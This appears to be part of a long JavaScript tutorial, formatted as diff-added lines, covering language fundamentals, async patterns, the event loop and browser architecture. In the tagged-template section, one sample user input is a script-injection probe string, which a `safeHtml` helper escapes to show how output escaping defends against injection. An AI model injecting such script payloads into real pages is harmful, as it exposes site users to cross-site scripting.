+<p>JavaScript has exactly <strong>8 types</strong>: 7 primitives (<code>undefined</code>, <code>null</code>, <code>boolean</code>, <code>number</code>, <code>bigint</code>, <code>string</code>, <code>symbol</code>) plus <code>object</code> (which includes arrays, functions, dates, maps, sets — everything non-primitive).</p>
+<pre data-lang="javascript"><code>typeof undefined   // "undefined"
+typeof null        // "object"   &lt;- famous historical bug, kept forever for compatibility
+typeof 42          // "number"
+typeof 42n         // "bigint"
+typeof "hi"        // "string"
+typeof true        // "boolean"
+typeof Symbol()    // "symbol"
+typeof {}          // "object"
+typeof []          // "object"   &lt;- arrays are objects; use Array.isArray()
+typeof function(){} // "function" (a callable object)</code></pre>
+<p><code>number</code> is a single IEEE-754 double-precision float type for <em>everything</em> — there's no separate int type, which is why <code>0.1 + 0.2 === 0.30000000000000004</code> and why integers beyond <code>Number.MAX_SAFE_INTEGER</code> (2^53 − 1) lose precision. <code>BigInt</code> (<code>42n</code>) exists specifically to represent arbitrary-precision integers when that matters (crypto, large IDs).</p>
+<p><strong>Coercion</strong> is JavaScript converting a value's type implicitly to make an operation work. <code>==</code> (loose equality) coerces; <code>===</code> (strict equality) never does — always use <code>===</code> unless you have a specific, commented reason not to.</p>
+<pre data-lang="javascript"><code>"5" == 5        // true  — string coerced to number
+null == undefined  // true — special-cased, both "nullish"
+0 == false      // true  — boolean coerced to number
+"" == 0         // true  — both coerce to 0
+[] == false     // true  — array -&gt; string "" -&gt; number 0
+
+"5" === 5       // false — no coercion, different types
+null === undefined // false</code></pre>
+<p>Memorize the two <code>==</code> exceptions worth keeping (<code>null == undefined</code> is a genuinely useful "is this nullish" check) and otherwise ban <code>==</code> via ESLint's <code>eqeqeq</code> rule — the coercion table is not something anyone should rely on from memory in review.</p>
+<h2 id="4-variables-and-scope-var-let-const-hoisting-the-tdz">4. Variables and scope: <code>var</code>/<code>let</code>/<code>const</code>, hoisting, the TDZ<a class="anchor" href="#4-variables-and-scope-var-let-const-hoisting-the-tdz" aria-hidden="true">#</a></h2>
+<pre data-lang="javascript"><code>var a = 1;    // function-scoped, hoisted, re-declarable — avoid in new code
+let b = 2;    // block-scoped, hoisted into a "temporal dead zone", not re-declarable
+const c = 3;  // block-scoped like let, binding cannot be reassigned (contents still mutable)
+
+const arr = [1, 2];
+arr.push(3);   // fine — the array's contents mutate
+arr = [];      // TypeError — the binding `arr` is const</code></pre>
+<p><strong>Hoisting</strong>: declarations are processed before code runs, but <code>var</code> and <code>let</code>/<code>const</code> behave differently:</p>
+<pre data-lang="javascript"><code>console.log(x);  // undefined (not an error) — var is hoisted AND initialized to undefined
+var x = 5;
+
+console.log(y);  // ReferenceError: Cannot access 'y' before initialization
+let y = 5;        // let/const are hoisted but NOT initialized — this gap is the
+                   // "Temporal Dead Zone" (TDZ), and it's a deliberate safety net</code></pre>
+<p>The classic <code>var</code>-in-a-loop closure bug, and why <code>let</code> fixed it:</p>
+<pre data-lang="javascript"><code>// var: all three callbacks share ONE function-scoped `i`, which is 3 by the time they run
+for (var i = 0; i &lt; 3; i++) {
+  setTimeout(() =&gt; console.log(i), 0);   // logs 3, 3, 3
+}
+
+// let: each iteration gets its OWN block-scoped binding of `i`
+for (let i = 0; i &lt; 3; i++) {
+  setTimeout(() =&gt; console.log(i), 0);   // logs 0, 1, 2
+}</code></pre>
+<p><strong>Closures</strong>: a function "closes over" the variables in its surrounding scope, keeping them alive even after that scope has returned — this is the mechanism behind the <code>let</code> example above, and behind every module pattern, memoizer, and event handler that references outer state.</p>
+<pre data-lang="javascript"><code>function makeCounter() {
+  let count = 0;               // captured by the closure below
+  return function increment() {
+    count += 1;
+    return count;
+  };
+}
+const counter = makeCounter();
+counter(); // 1
+counter(); // 2 — `count` persisted between calls, private to this closure</code></pre>
+<h2 id="5-operators-and-control-flow">5. Operators and control flow<a class="anchor" href="#5-operators-and-control-flow" aria-hidden="true">#</a></h2>
+<p>Beyond the arithmetic/comparison basics, three operators pull real weight in modern code:</p>
+<pre data-lang="javascript"><code>const user = null;
+user?.profile?.name;        // optional chaining: undefined instead of throwing
+const name = user?.name ?? "Anonymous";  // nullish coalescing: only falls back on null/undefined
+
+// vs the older, buggier `||` fallback:
+const count = 0;
+count || 10;   // 10 — WRONG if 0 is a valid value, `||` treats it as falsy
+count ?? 10;   // 0  — CORRECT, ?? only falls back on null/undefined</code></pre>
+<p><code>switch</code> uses <code>===</code> semantics and needs explicit <code>break</code> (fallthrough is intentional and common for grouping cases); prefer object-literal lookup tables or a <code>Map</code> over long <code>if/else if</code> chains for pure value dispatch.</p>
+<h2 id="6-functions-in-depth-closures-this-call-apply-bind">6. Functions in depth: closures, <code>this</code>, <code>call</code>/<code>apply</code>/<code>bind</code><a class="anchor" href="#6-functions-in-depth-closures-this-call-apply-bind" aria-hidden="true">#</a></h2>
+<p>Four ways to write a function, with real behavioral differences:</p>
+<pre data-lang="javascript"><code>function declared() {}                  // hoisted fully — usable before its definition
+const expr = function() {};             // hoisted as `undefined`, only usable after assignment
+const arrow = () =&gt; {};                 // no own `this`, `arguments`, or `prototype`
+class C { method() {} }                 // method shorthand, not enumerable, strict mode always</code></pre>
+<p><strong><code>this</code></strong> is the single most common source of JS confusion. It is NOT lexically scoped for regular functions — it's determined by <em>how the function is called</em>, not where it's defined:</p>
+<pre data-lang="javascript"><code>const obj = {
+  name: "obj",
+  regular: function () { return this.name; },
+  arrow: () =&gt; { return this?.name; },   // `this` here is captured from the ENCLOSING scope
+};
+
+obj.regular();          // "obj" — called as obj.regular(), so `this` = obj
+const fn = obj.regular;
+fn();                   // undefined (or throws in strict mode) — called bare, `this` is undefined
+obj.arrow();            // undefined — arrow functions never bind their own `this`</code></pre>
+<p><code>call</code>/<code>apply</code>/<code>bind</code> explicitly control <code>this</code>:</p>
+<pre data-lang="javascript"><code>function greet(greeting) { return `${greeting}, ${this.name}`; }
+const person = { name: "Ada" };
+
+greet.call(person, "Hi");     // "Hi, Ada" — invoke immediately, args listed individually
+greet.apply(person, ["Hi"]);  // "Hi, Ada" — invoke immediately, args as an array
+const bound = greet.bind(person);
+bound("Hi");                   // "Hi, Ada" — returns a NEW function permanently bound to `person`</code></pre>
+<blockquote>
+<p><strong>Real-world example.</strong> React class components historically needed <code>this.handleClick = this.handleClick.bind(this)</code> in the constructor for exactly this reason — passing <code>this.handleClick</code> as a callback strips it from <code>this.</code> Hooks and arrow-function class fields made this mostly historical, but the underlying <code>this</code>-binding rule hasn't changed.</p>
+</blockquote>
+<h2 id="7-objects-and-prototypes-the-prototype-chain-classes-as-sugar">7. Objects and prototypes: the prototype chain, classes as sugar<a class="anchor" href="#7-objects-and-prototypes-the-prototype-chain-classes-as-sugar" aria-hidden="true">#</a></h2>
+<p>Every JS object has an internal link to another object — its <strong>prototype</strong> — forming a chain that property lookups walk up until found or the chain ends at <code>null</code>.</p>
+<pre data-lang="javascript"><code>const animal = { eats: true };
+const rabbit = Object.create(animal);   // rabbit's prototype is `animal`
+rabbit.hops = true;
+
+rabbit.eats;   // true — not own property, found via the prototype chain
+rabbit.hops;   // true — own property
+
+Object.getPrototypeOf(rabbit) === animal;  // true</code></pre>
+<p><strong><code>class</code> is syntax sugar over exactly this mechanism</strong> — no new object model, just a cleaner syntax for prototype-based inheritance plus real private fields:</p>
+<pre data-lang="javascript"><code>class Animal {
+  #internalId;                          // truly private — inaccessible outside the class
+  constructor(name) { this.name = name; this.#internalId = crypto.randomUUID(); }
+  speak() { return `${this.name} makes a sound.`; }
+}
+class Dog extends Animal {
+  speak() { return `${super.speak()} Specifically, a bark.`; }
+}
+new Dog("Rex").speak();
+// "Rex makes a sound. Specifically, a bark."
+
+// Under the hood this is equivalent to:
+// Dog.prototype = Object.create(Animal.prototype);
+// Dog.prototype.speak calls Animal.prototype.speak via `super`</code></pre>
+<h2 id="8-arrays-and-iteration-methods-iterators-generators">8. Arrays and iteration: methods, iterators, generators<a class="anchor" href="#8-arrays-and-iteration-methods-iterators-generators" aria-hidden="true">#</a></h2>
+<p>Arrays are objects with numeric keys and a <code>length</code> that auto-updates. The functional methods (<code>map</code>/<code>filter</code>/<code>reduce</code>) don't mutate; a handful of older methods (<code>push</code>, <code>splice</code>, <code>sort</code>, <code>reverse</code>) do — know which is which, since mutating a shared array is a classic bug source in UI state.</p>
+<pre data-lang="javascript"><code>const nums = [1, 2, 3, 4, 5];
+nums.map(n =&gt; n * 2);              // [2,4,6,8,10] — new array
+nums.filter(n =&gt; n % 2 === 0);     // [2,4]        — new array
+nums.reduce((sum, n) =&gt; sum + n, 0); // 15          — folds to one value
+nums.sort((a, b) =&gt; b - a);        // MUTATES nums in place, now [5,4,3,2,1]</code></pre>
+<p>The <strong>iterator protocol</strong> is what makes <code>for...of</code>, spread (<code>...</code>), and destructuring work on arrays, <code>Map</code>, <code>Set</code>, strings, and any custom object that implements <code>Symbol.iterator</code>:</p>
+<pre data-lang="javascript"><code>class Range {
+  constructor(start, end) { this.start = start; this.end = end; }
+  [Symbol.iterator]() {
+    let current = this.start, end = this.end;
+    return {
+      next() {
+        return current &lt;= end
+          ? { value: current++, done: false }
+          : { value: undefined, done: true };
+      },
+    };
+  }
+}
+[...new Range(1, 5)];        // [1,2,3,4,5] — works because Range implements the protocol
+for (const n of new Range(1, 3)) console.log(n); // 1, 2, 3</code></pre>
+<p><strong>Generators</strong> (<code>function*</code>) are a shortcut for writing iterators without hand-rolling <code>next()</code>:</p>
+<pre data-lang="javascript"><code>function* range(start, end) {
+  for (let i = start; i &lt;= end; i++) yield i;
+}
+[...range(1, 5)];   // [1,2,3,4,5]</code></pre>
+<p>Generators also underpin how async iteration and (historically) some coroutine-style async patterns work — <code>yield</code> pauses execution and hands a value out, exactly like <code>await</code> pauses on a promise (§14).</p>
+<h2 id="9-strings-template-literals-and-regular-expressions">9. Strings, template literals, and regular expressions<a class="anchor" href="#9-strings-template-literals-and-regular-expressions" aria-hidden="true">#</a></h2>
+<p>Strings are immutable UTF-16 sequences — every "mutating" string method returns a new string. Template literals (<code>`...`</code>) support interpolation and multi-line strings natively, and <strong>tagged templates</strong> let a function intercept and transform the literal before it's assembled — the mechanism behind libraries like <code>styled-components</code> and safe SQL-templating helpers:</p>
+<pre data-lang="javascript"><code>function safeHtml(strings, ...values) {
+  const escape = (s) =&gt; String(s).replace(/[&amp;&lt;&gt;"']/g, c =&gt; ({
+    "&amp;": "&amp;amp;", "&lt;": "&amp;lt;", "&gt;": "&amp;gt;", '"': "&amp;quot;", "'": "&amp;#39;",
+  }[c]));
+  return strings.reduce((out, str, i) =&gt;
+    out + str + (i &lt; values.length ? escape(values[i]) : ""), "");
+}
+const userInput = "&lt;script&gt;alert(1)&lt;/script&gt;";
+safeHtml`&lt;p&gt;Hello, ${userInput}&lt;/p&gt;`;
+// "&lt;p&gt;Hello, &amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&lt;/p&gt;" — escaped automatically</code></pre>
+<p>Regular expressions (<code>/pattern/flags</code>) are used via <code>.test()</code>, <code>.match()</code>, <code>.matchAll()</code>, and <code>String.prototype.replace</code>. Named capture groups make extraction readable:</p>
+<pre data-lang="javascript"><code>const re = /(?&lt;year&gt;\d{4})-(?&lt;month&gt;\d{2})-(?&lt;day&gt;\d{2})/;
+const m = "2026-09-13".match(re);
+m.groups.year;   // "2026"</code></pre>
+<h2 id="10-error-handling-try-catch-custom-error-subclasses">10. Error handling: <code>try</code>/<code>catch</code>, custom <code>Error</code> subclasses<a class="anchor" href="#10-error-handling-try-catch-custom-error-subclasses" aria-hidden="true">#</a></h2>
+<pre data-lang="javascript"><code>class ValidationError extends Error {
+  constructor(message, field) {
+    super(message);
+    this.name = "ValidationError";
+    this.field = field;
+  }
+}
+
+function validateAge(age) {
+  if (age &lt; 0) throw new ValidationError("Age cannot be negative", "age");
+  return age;
+}
+
+try {
+  validateAge(-5);
+} catch (err) {
+  if (err instanceof ValidationError) {
+    console.error(`Invalid ${err.field}: ${err.message}`);
+  } else {
+    throw err;   // re-throw anything you didn't expect — never swallow silently
+  }
+} finally {
+  console.log("validation attempted");   // always runs, even after a return/throw
+}</code></pre>
+<p>Never write an empty <code>catch {}</code> — it hides real bugs. If you genuinely don't care about an error, catch it and log it, so a silent failure is at least discoverable in production logs.</p>
+<h2 id="11-mini-project-a-cli-todo-app-node">11. Mini project: a CLI todo app (Node)<a class="anchor" href="#11-mini-project-a-cli-todo-app-node" aria-hidden="true">#</a></h2>
+<pre data-lang="javascript"><code>// todo.js — node todo.js add "Buy milk" | node todo.js list | node todo.js done 0
+import { readFileSync, writeFileSync, existsSync } from "node:fs";
+
+const DB_PATH = "./todos.json";
+
+function loadTodos() {
+  return existsSync(DB_PATH) ? JSON.parse(readFileSync(DB_PATH, "utf8")) : [];
+}
+function saveTodos(todos) {
+  writeFileSync(DB_PATH, JSON.stringify(todos, null, 2));
+}
+
+const [, , command, ...args] = process.argv;
+const todos = loadTodos();
+
+switch (command) {
+  case "add":
+    todos.push({ text: args.join(" "), done: false });
+    saveTodos(todos);
+    console.log(`Added: "${args.join(" ")}"`);
+    break;
+  case "list":
+    todos.forEach((t, i) =&gt; console.log(`${i}: [${t.done ? "x" : " "}] ${t.text}`));
+    break;
+  case "done":
+    const idx = Number(args[0]);
+    if (todos[idx]) { todos[idx].done = true; saveTodos(todos); console.log("Marked done."); }
+    break;
+  default:
+    console.log("Usage: todo.js &lt;add|list|done&gt; [args]");
+}</code></pre>
+<p>This exercises closures-free module state (a file as the "database"), array methods, template literals, and basic error-free control flow — the full Part I toolkit.</p>
+<hr>
+<h1 id="part-ii-intermediate-async-javascript-and-the-event-loop">Part II — Intermediate: async JavaScript and the event loop<a class="anchor" href="#part-ii-intermediate-async-javascript-and-the-event-loop" aria-hidden="true">#</a></h1>
+<h2 id="12-the-call-stack-heap-and-the-event-loop-model">12. The call stack, heap, and the event loop model<a class="anchor" href="#12-the-call-stack-heap-and-the-event-loop-model" aria-hidden="true">#</a></h2>
+<p>JavaScript engines run on <strong>one call stack per realm</strong> (§37 explains what "realm" means precisely). Long-running synchronous code blocks that single stack completely — nothing else, including UI rendering, can happen until it unwinds. Understanding <em>why</em> async APIs exist, and <em>how</em> they resume, is the single highest-leverage piece of JS knowledge for building responsive apps.</p>
+<pre><code>   Call Stack                 Web APIs / Node APIs         Callback Queues
+  ┌───────────┐             ┌──────────────────────┐     ┌─────────────────┐
+  │  main()   │──setTimeout─▶│ timer (browser/libuv) │     │  Macrotask queue │
+  │  fetch()  │──fetch──────▶│ network stack         │────▶│  (setTimeout,    │
+  └───────────┘             └──────────────────────┘     │   I/O, UI events)│
+        ▲                                                  └─────────────────┘
+        │                                                           │
+        │              Event Loop: "is the stack empty?"            │
+        │              if yes: drain ALL microtasks first,          │
+        └──────────────pop one task, push it onto the stack─────────┘
+                              ┌─────────────────┐
+                              │ Microtask queue  │  (Promise .then/.catch,
+                              │                  │   queueMicrotask, async/await
+                              └─────────────────┘   resumption)</code></pre>
+<p>The critical ordering rule, tested in every JS interview and hit in every real async bug: <strong>after each single task, the engine fully drains the microtask queue before running the next task (or the next paint).</strong></p>
+<pre data-lang="javascript"><code>console.log("1: sync");
+
+setTimeout(() =&gt; console.log("2: macrotask (setTimeout)"), 0);
+
+Promise.resolve().then(() =&gt; console.log("3: microtask (promise)"));
+
+queueMicrotask(() =&gt; console.log("4: microtask (queueMicrotask)"));
+
+console.log("5: sync");
+
+// Output order: 1, 5, 3, 4, 2
+// Both synchronous logs run first (the stack never yields mid-script).
+// Then ALL queued microtasks drain (3 then 4, in queue order) —
+// THEN, only once the microtask queue is empty, the engine picks up
+// the next macrotask (2).</code></pre>
+<p>This is why a microtask that queues another microtask can, in principle, starve the event loop from ever reaching a macrotask (a real, documented performance bug class — an infinite chain of <code>Promise.resolve().then(...)</code> will hang a page just as thoroughly as a synchronous <code>while(true)</code>).</p>
+<h2 id="13-callbacks-and-promises-what-actually-happens-under-the-hood">13. Callbacks and Promises: what actually happens under the hood<a class="anchor" href="#13-callbacks-and-promises-what-actually-happens-under-the-hood" aria-hidden="true">#</a></h2>
+<p>Before Promises, async results were delivered via callbacks — functions passed in and invoked later. Nesting them for sequential async steps produces "callback hell":</p>
+<pre data-lang="javascript"><code>getUser(id, (err, user) =&gt; {
+  if (err) return handleError(err);
+  getPosts(user.id, (err, posts) =&gt; {
+    if (err) return handleError(err);
+    getComments(posts[0].id, (err, comments) =&gt; {
+      if (err) return handleError(err);
+      render(user, posts, comments);   // 3 levels deep, error handling repeated 3x
+    });
+  });
+});</code></pre>
+<p>A <strong>Promise</strong> is a state machine with exactly three states — <code>pending</code> → <code>fulfilled</code> or <code>pending</code> → <code>rejected</code> — and once settled, it never changes again. <code>.then()</code> doesn't run the callback synchronously even if the promise is already resolved; it always schedules it as a microtask, which is what guarantees consistent ordering.</p>
+<pre data-lang="javascript"><code>function delay(ms, value) {
+  return new Promise((resolve) =&gt; setTimeout(() =&gt; resolve(value), ms));
+}
+
+delay(100, "done")
+  .then((value) =&gt; { console.log(value); return value.toUpperCase(); })
+  .then((upper) =&gt; console.log(upper))
+  .catch((err) =&gt; console.error("caught:", err));   // catches a rejection at ANY step above</code></pre>
+<p>Promise combinators for concurrent work:</p>
+<pre data-lang="javascript"><code>Promise.all([p1, p2, p3]);        // resolves when ALL resolve; rejects fast on the FIRST rejection
+Promise.allSettled([p1, p2, p3]); // always resolves, with { status, value|reason } for each
+Promise.race([p1, p2, p3]);       // settles as soon as the FIRST one settles (resolve or reject)
+Promise.any([p1, p2, p3]);        // resolves on the FIRST fulfillment; rejects only if ALL reject</code></pre>
+<blockquote>
+<p><strong>War story.</strong> A team used <code>Promise.all</code> to fetch 5 independent dashboard widgets' data. One flaky endpoint failing 2% of the time took down the <em>entire</em> dashboard on every request, because <code>Promise.all</code> rejects as soon as any one promise rejects — the other 4 successful results were thrown away. Switching to <code>Promise.allSettled</code> and rendering each widget independently based on its own settled result fixed it in one line.</p>
+</blockquote>
+<h2 id="14-async-await-sugar-over-promises-and-its-sharp-edges">14. <code>async</code>/<code>await</code>: sugar over promises, and its sharp edges<a class="anchor" href="#14-async-await-sugar-over-promises-and-its-sharp-edges" aria-hidden="true">#</a></h2>
+<p><code>async</code>/<code>await</code> doesn't change the underlying microtask machinery — it's syntax that makes promise chains read like synchronous code. An <code>async</code> function always returns a Promise; <code>await</code> pauses the function (not the whole program) until the awaited promise settles.</p>
+<pre data-lang="javascript"><code>async function loadDashboard(userId) {
+  try {
+    const user = await getUser(userId);       // pauses here, yields to the event loop
+    const posts = await getPosts(user.id);    // then here
+    return { user, posts };
+  } catch (err) {
+    // catches rejections from EITHER await above — same benefit as .catch()
+    throw new Error(`Dashboard load failed: ${err.message}`);
+  }
+}</code></pre>
+<p>The sharp edge: sequential <code>await</code>s that don't depend on each other serialize work that could run concurrently.</p>
+<pre data-lang="javascript"><code>// SLOW: each await blocks the next from even starting — total time = sum of both
+const user = await getUser(id);
+const settings = await getSettings(id);   // doesn't need `user` — but waits anyway
+
+// FAST: start both requests immediately, await their results together
+const [user, settings] = await Promise.all([getUser(id), getSettings(id)]);</code></pre>
+<h2 id="15-timers-and-scheduling-settimeout-raf-requestidlecallback-messagechannel">15. Timers and scheduling: <code>setTimeout</code>, rAF, <code>requestIdleCallback</code>, <code>MessageChannel</code><a class="anchor" href="#15-timers-and-scheduling-settimeout-raf-requestidlecallback-messagechannel" aria-hidden="true">#</a></h2>
+<p>Not all "run this later" APIs are equal — each is a different macrotask source tuned for a different purpose:</p>
+<div class="tbl"><table>
+<thead><tr><th>API</th><th>Fires</th><th>Use for</th></tr></thead>
+<tbody>
+<tr><td><code>setTimeout(fn, 0)</code></td><td>Next macrotask turn, but browsers clamp nested timeouts to a <strong>minimum ~4ms</strong> after 5 levels of nesting</td><td>General deferred work</td></tr>
+<tr><td><code>requestAnimationFrame(fn)</code></td><td>Right before the next repaint, synced to the display's refresh rate (~60Hz = 16.6ms)</td><td>Any visual animation — never animate with <code>setInterval</code></td></tr>
+<tr><td><code>requestIdleCallback(fn)</code></td><td>During browser idle periods, with a deadline you must respect</td><td>Low-priority background work (analytics batching, prefetch) that shouldn't compete with rendering</td></tr>
+<tr><td><code>queueMicrotask(fn)</code></td><td>End of the current task, before the next macrotask/paint (§12)</td><td>Deferring work to just after the current synchronous block, without a full event-loop turn</td></tr>
+<tr><td><code>MessageChannel</code></td><td>Macrotask, but with <strong>no minimum delay clamp</strong> unlike <code>setTimeout(fn, 0)</code></td><td>The fastest legal way to yield to the event loop — used internally by React's scheduler</td></tr>
+</tbody></table></div>
+<pre data-lang="javascript"><code>function animate() {
+  element.style.transform = `translateX(${x++}px)`;
+  if (x &lt; 300) requestAnimationFrame(animate);   // self-scheduling, paced to the display
+}
+requestAnimationFrame(animate);</code></pre>
+<h2 id="16-modules-commonjs-vs-es-modules-bundlers-dynamic-import">16. Modules: CommonJS vs ES Modules, bundlers, dynamic <code>import()</code><a class="anchor" href="#16-modules-commonjs-vs-es-modules-bundlers-dynamic-import" aria-hidden="true">#</a></h2>
+<p>Two module systems coexist in the JS ecosystem:</p>
+<pre data-lang="javascript"><code>// CommonJS (Node's original system, synchronous, still everywhere in npm packages)
+const fs = require("node:fs");
+module.exports = { readConfig };
+
+// ES Modules (the language standard, async-capable, works natively in browsers)
+import fs from "node:fs";
+export function readConfig() { /* ... */ }
+export default class Config { /* ... */ }</code></pre>
+<p>Key differences: ESM is <strong>statically analyzable</strong> (imports/exports are determined before execution, enabling tree-shaking — bundlers can delete unused exports), is always strict mode, and has live bindings (an imported value updates if the exporting module changes it, unlike CommonJS's snapshot-at-require-time copy).</p>
+<p><strong>Dynamic <code>import()</code></strong> returns a Promise and is the standard way to code-split — load a module only when it's actually needed:</p>
+<pre data-lang="javascript"><code>button.addEventListener("click", async () =&gt; {
+  const { openEditor } = await import("./editor.js");   // fetched only on first click
+  openEditor();
+});</code></pre>
+<p><strong>Bundlers</strong> (Webpack, esbuild, Vite/Rollup) exist because: browsers didn't support ESM until ~2018 (Webpack predates browser ESM), <code>node_modules</code> has thousands of small files that are faster to serve as fewer bundles, and bundlers do tree-shaking, minification, and transform newer syntax down for older targets.</p>
+<h2 id="17-mini-project-an-async-task-queue-with-concurrency-limits-and-retry">17. Mini project: an async task queue with concurrency limits and retry<a class="anchor" href="#17-mini-project-an-async-task-queue-with-concurrency-limits-and-retry" aria-hidden="true">#</a></h2>
+<pre data-lang="javascript"><code>class TaskQueue {
+  #concurrency; #running = 0; #queue = [];
+  constructor(concurrency = 3) { this.#concurrency = concurrency; }
+
+  add(taskFn, { retries = 2 } = {}) {
+    return new Promise((resolve, reject) =&gt; {
+      this.#queue.push({ taskFn, retries, resolve, reject });
+      this.#next();
+    });
+  }
+
+  async #next() {
+    if (this.#running &gt;= this.#concurrency || this.#queue.length === 0) return;
+    this.#running++;
+    const item = this.#queue.shift();
+    try {
+      resolve_result: {
+        try {
+          const result = await item.taskFn();
+          item.resolve(result);
+          break resolve_result;
+        } catch (err) {
+          if (item.retries &gt; 0) {
+            this.#queue.push({ ...item, retries: item.retries - 1 });
+          } else {
+            item.reject(err);
+          }
+        }
+      }
+    } finally {
+      this.#running--;
+      this.#next();   // pull the next queued item, whether we just succeeded or freed a slot
+    }
+  }
+}
+
+const queue = new TaskQueue(2);   // only 2 fetches in flight at once
+const urls = ["/api/a", "/api/b", "/api/c", "/api/d", "/api/e"];
+const results = await Promise.all(
+  urls.map((url) =&gt; queue.add(() =&gt; fetch(url).then((r) =&gt; r.json())))
+);</code></pre>
+<p>This is the exact shape of pattern real apps use to avoid saturating a browser's per-origin connection limit (historically 6 for HTTP/1.1, see §26) when firing many requests at once.</p>
+<hr>
+<h1 id="part-iii-inside-the-browser">Part III — Inside the browser<a class="anchor" href="#part-iii-inside-the-browser" aria-hidden="true">#</a></h1>
+<h2 id="18-the-browser-s-process-model-multi-process-architecture-and-site-isolation">18. The browser's process model: multi-process architecture and site isolation<a class="anchor" href="#18-the-browser-s-process-model-multi-process-architecture-and-site-isolation" aria-hidden="true">#</a></h2>
+<p>A modern browser is not one program — it's several cooperating <strong>processes</strong>, because a single-process browser means one crashed tab (or one exploited renderer bug) takes down everything, including your banking tab open in another window.</p>
+<pre><code>┌─────────────────────────────────────────────────────────────┐
+│ Browser Process (1, privileged: disk, network sockets, UI)   │
+│  - owns the address bar, bookmarks, extensions installation  │
+│  - the ONLY process allowed to touch the filesystem directly │
+└───────────────┬───────────────────────────────────────────────┘
+                │ IPC (Chrome: Mojo; Firefox: IPDL)
+    ┌───────────┼──────────────┬─────────────────┬───────────────┐
+    ▼           ▼              ▼                 ▼               ▼
+┌────────┐ ┌────────┐    ┌──────────┐      ┌───────────┐  ┌────────────┐
+│Renderer│ │Renderer│ ... │GPU process│      │Network    │  │Utility procs│
+│(tab A) │ │(tab B) │    │(compositing,      │process    │  │(audio, etc.)│
+│sandboxed│ │sandboxed│   │ rasterization)   │(fetches,   │  └────────────┘
+│no disk/ │ │no disk/ │   └──────────┘      │ DNS, TLS) │
+│network  │ │network  │                     └───────────┘
+└────────┘ └────────┘</code></pre>
+<p>Each <strong>renderer process</strong> runs a heavily sandboxed copy of the engine (Blink, Gecko, or WebKit) and is <em>deliberately</em> denied direct filesystem/network access — it must ask the privileged browser process via IPC for everything. This is the concrete mechanism that limits the blast radius of a compromised renderer (e.g., an exploited PDF parser or a malicious ad) from becoming a full system compromise.</p>
+<p><strong>Site isolation</strong> (shipped in Chrome since 2018, largely in response to Spectre) puts each <strong>origin</strong> — not just each tab — in its own renderer process by default. This is why opening dev tools and inspecting the "Frames" tree of a page with cross-origin iframes shows genuinely separate processes: a malicious iframe's renderer process physically cannot read memory belonging to the parent page's renderer process, closing off an entire class of speculative-execution side-channel attacks (§51).</p>
+<blockquote>
+<p><strong>Real-world example.</strong> Task Manager (Chrome: <code>Shift+Esc</code>) literally shows you this architecture — one row per renderer process (often one per tab, sometimes more for cross-origin iframes), one row for the GPU process, one for the network service. A tab using 400MB isn't "the browser" using 400MB — it's that specific renderer process's V8 heap + DOM + layout data.</p>
+</blockquote>
+<h2 id="19-browser-engines-compared-blink-v8-gecko-spidermonkey-webkit-javascriptcore">19. Browser engines compared: Blink/V8, Gecko/SpiderMonkey, WebKit/JavaScriptCore<a class="anchor" href="#19-browser-engines-compared-blink-v8-gecko-spidermonkey-webkit-javascriptcore" aria-hidden="true">#</a></h2>
+<p>An "engine" bundles a <strong>rendering engine</strong> (HTML/CSS parsing, layout, paint) and a <strong>JS engine</strong>. The three lineages in active use:</p>
+<div class="tbl"><table>
+<thead><tr><th></th><th>Rendering engine</th><th>JS engine</th><th>Ships in</th></tr></thead>
+<tbody>
+<tr><td><strong>Chromium family</strong></td><td>Blink (forked from WebKit in 2013)</td><td>V8</td><td>Chrome, Edge, Brave, Opera, Samsung Internet, Arc</td></tr>
+<tr><td><strong>Firefox</strong></td><td>Gecko</td><td>SpiderMonkey</td><td>Firefox only</td></tr>
+<tr><td><strong>Safari / all iOS browsers</strong></td><td>WebKit</td><td>JavaScriptCore</td><td>Safari, and — by Apple App Store policy until the EU's DMA forced an exception — every "Chrome" or "Firefox" on iOS, which are actually WebKit wrappers</td></tr>
+</tbody></table></div>
+<p>Concrete engineering differences that surface as real bugs:</p>
+<ul>
+<li><strong>CSS feature timing</strong>: Blink ships experimental CSS behind flags fastest (largest market share, fastest iteration); Safari has historically lagged on features like <code>:has()</code>, container queries, and specific <code>backdrop-filter</code> behaviors — "works in Chrome" bug reports are overwhelmingly a WebKit gap.</li>
+<li><strong>Layout algorithm quirks</strong>: subpixel rounding, flexbox gap interpretation in older versions, and <code>position: sticky</code> inside <code>overflow</code> containers have all had genuinely different (spec-ambiguous) behavior across engines.</li>
+<li><strong>JS engine GC pause characteristics</strong>: V8's generational GC (§50) and JavaScriptCore's differ enough that the <em>same</em> allocation-heavy code can show different jank patterns per browser — a page smooth in Chrome can stutter in Safari purely from GC timing, not a logic bug.</li>
+<li><strong>Memory/process limits</strong>: mobile Safari (WebKit) has historically imposed much tighter per-tab memory ceilings than desktop Chrome, causing tab reloads on data-heavy SPAs that never reproduce on a developer's desktop Chrome.</li>
+</ul>
+<p><strong>Why this matters for testing</strong>: automated cross-browser testing (Playwright driving real Chromium, Firefox, <em>and</em> WebKit builds — not just "Chrome headless") is the only way to catch these; unit tests running in jsdom (which approximates a DOM but implements neither a real layout engine nor a real JS engine) cannot catch layout- or engine-specific bugs by construction.</p>
+<h2 id="20-the-dom-and-bom-window-document-node-trees-the-cssom">20. The DOM and BOM: <code>window</code>, <code>document</code>, node trees, the CSSOM<a class="anchor" href="#20-the-dom-and-bom-window-document-node-trees-the-cssom" aria-hidden="true">#</a></h2>
+<p>The <strong>BOM</strong> (Browser Object Model) is everything about the browser window itself: <code>window</code>, <code>navigator</code>, <code>location</code>, <code>history</code>, <code>screen</code>. The <strong>DOM</strong> (Document Object Model) is the tree representation of the page's markup that JS can read and mutate — <code>document</code> is its root.</p>
+<pre data-lang="javascript"><code>document.documentElement;          // &lt;html&gt;
+document.body;                     // &lt;body&gt;
+document.querySelector(".card");   // first matching element
+document.querySelectorAll("li");   // NodeList of all matches (static snapshot, not live)
+
+const el = document.createElement("div");
+el.className = "card";
+el.textContent = "Hello";
+document.body.appendChild(el);     // this single call triggers a layout recalculation (§21)</code></pre>
+<p>The <strong>CSSOM</strong> (CSS Object Model) is the analogous tree for parsed stylesheets — every rule, selector, and computed property, accessible via <code>getComputedStyle(el)</code>. The browser cannot build the final render tree (§21) until <em>both</em> the DOM and CSSOM are ready, which is why a <code>&lt;link rel= "stylesheet"&gt;</code> in <code>&lt;head&gt;</code> without <code>async</code>/<code>defer</code> blocks first paint: the browser deliberately waits rather than flashing unstyled content.</p>
